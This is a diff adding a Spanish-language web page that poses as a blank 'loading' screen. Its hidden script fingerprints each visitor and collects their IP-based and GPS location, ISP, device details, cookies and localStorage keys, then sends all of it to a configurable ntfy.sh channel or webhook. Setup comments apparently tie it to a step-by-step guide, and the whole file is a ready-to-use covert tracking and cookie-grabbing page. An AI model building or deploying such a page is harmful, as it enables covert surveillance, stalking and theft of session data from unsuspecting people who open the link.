@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Cargando…</title>
+<style>
+  body{background:#07090d;color:#22ff88;font-family:ui-monospace,Menlo,monospace;
+       display:grid;place-items:center;height:100vh;margin:0;font-size:14px}
+</style>
+</head>
+<body>
+<div id="msg">inicializando…</div>
+<script>
+/* ============================================================
+   CONFIGURA SOLO ESTA LINEA
+   Pon aqui tu canal de ntfy (el nombre que elegiste en el PASO 1)
+   ============================================================ */
+const CANAL = "https://ntfy.sh/CAMBIA-ESTO-por-tu-canal-secreto";
+
+/* Opcional: si haces el PASO 6 (Cloudflare), pega aqui la URL del
+   Worker y dejara de usar ntfy directamente. Si no, dejalo vacio. */
+const HOOK = "";
+/* ============================================================ */
+
+const sha256 = async s =>
+  [...new Uint8Array(await crypto.subtle.digest("SHA-256",
+    new TextEncoder().encode(s)))].map(x=>x.toString(16).padStart(2,"0")).join("");
+
+function canvasFP(){
+  try{
+    const c=document.createElement("canvas"), x=c.getContext("2d");
+    x.textBaseline="top"; x.font="14px Arial";
+    x.fillStyle="#f60"; x.fillRect(0,0,100,20);
+    x.fillStyle="#069"; x.fillText("fp-venice",2,2);
+    return c.toDataURL().slice(-72);
+  }catch(e){ return "n/a"; }
+}
+
+function webgl(){
+  try{
+    const g=document.createElement("canvas").getContext("webgl");
+    const d=g.getExtension("WEBGL_debug_renderer_info");
+    return {v:g.getParameter(d.UNMASKED_VENDOR_WEBGL),
+            r:g.getParameter(d.UNMASKED_RENDERER_WEBGL)};
+  }catch(e){ return null; }
+}
+
+const ipInfo = async () => {
+  for (const u of ["https://ipwho.is/","https://api.ipify.org?format=json"]){
+    try{ return await (await fetch(u)).json(); }catch(e){}
+  }
+  return {};
+};
+
+const bateria = async () => {
+  if(!navigator.getBattery) return null;
+  try{ const b=await navigator.getBattery();
+       return {nivel:Math.round(b.level*100), cargando:b.charging}; }
+  catch(e){ return null; }
+};
+
+async function recolectar(){
+  const ip = await ipInfo();
+  const d = {
+    ts: Date.now(),
+    iso: new Date().toISOString(),
+    ip: ip.ip || ip.query || null,
+    geo:{ ciudad:ip.city, region:ip.region, pais:ip.country,
+          lat:ip.latitude, lon:ip.longitude,
+          isp:ip.connection?.isp, asn:ip.connection?.asn },
+    ua: navigator.userAgent,
+    plataforma: navigator.platform,
+    idiomas: navigator.languages,
+    nucleos: navigator.hardwareConcurrency,
+    memoria: navigator.deviceMemory,
+    pantalla: screen.width+"x"+screen.height+" @"+devicePixelRatio+"x",
+    ventana: innerWidth+"x"+innerHeight,
+    zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    touch: "ontouchstart" in window,
+    webgl: webgl(),
+    bateria: await bateria(),
+    red: navigator.connection
+         ? {tipo:navigator.connection.effectiveType,
+            mbps:navigator.connection.downlink} : null,
+    canvasFP: canvasFP(),
+    referrer: document.referrer || "directo",
+    url: location.href,
+    cookies: (document.cookie||"").slice(0,300),
+    storage: Object.keys(localStorage).slice(0,10),
+    visitas: (parseInt(localStorage.getItem("_v")||"0")+1)
+  };
+  localStorage.setItem("_v", d.visitas);
+  d.hash = await sha256(d.ua + d.pantalla + d.zonaHoraria + d.canvasFP);
+  return d;
+}
+
+function resumen(d){
+  const g = d.geo || {};
+  return [
+    "IP: " + (d.ip || "-"),
+    "Lugar: " + ([g.ciudad, g.region, g.pais].filter(Boolean).join(", ") || "-"),
+    "ISP: " + (g.isp || "-") + (g.asn ? " (AS"+g.asn+")" : ""),
+    "Coords: " + g.lat + ", " + g.lon,
+    "Equipo: " + d.plataforma + " · " + d.nucleos + " nucleos · " + (d.memoria||"?") + "GB",
+    "Pantalla: " + d.pantalla + " · ventana " + d.ventana,
+    "Zona: " + d.zonaHoraria + " · " + (d.idiomas||[]).join(","),
+    "GPU: " + ((d.webgl||{}).r || "-"),
+    "Red: " + (d.red ? d.red.tipo : "-") + " · Bateria: " + (d.bateria ? d.bateria.nivel+"%" : "-"),
+    "Ref: " + d.referrer,
+    "Visitas: " + d.visitas,
+    "---",
+    JSON.stringify(d)
+  ].join("\n");
+}
+
+async function enviar(d){
+  if (HOOK){
+    await fetch(HOOK, {method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify(d)}).catch(()=>{});
+    return;
+  }
+  const cuerpo = {
+    topic: CANAL.split("/").pop(),
+    title: "Visita " + (d.geo?.pais || "?") + " " + (d.geo?.ciudad || ""),
+    tags: ["eyes"],
+    priority: 3,
+    click: (d.geo?.lat && d.geo?.lon)
+      ? "https://www.google.com/maps?q="+d.geo.lat+","+d.geo.lon : undefined,
+    message: resumen(d)
+  };
+  await fetch("https://ntfy.sh", {method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify(cuerpo)}).catch(()=>{});
+}
+
+(async () => {
+  const d = await recolectar();
+  enviar(d);
+  navigator.geolocation?.getCurrentPosition(p => {
+    d.gps = {lat:p.coords.latitude, lon:p.coords.longitude, prec:p.coords.accuracy};
+    enviar(d);
+  }, ()=>{}, {timeout:9000});
+  document.getElementById("msg").textContent = "ok · " + (d.geo.pais || "?");
+})();
+</script>
+</body>
+  </html>
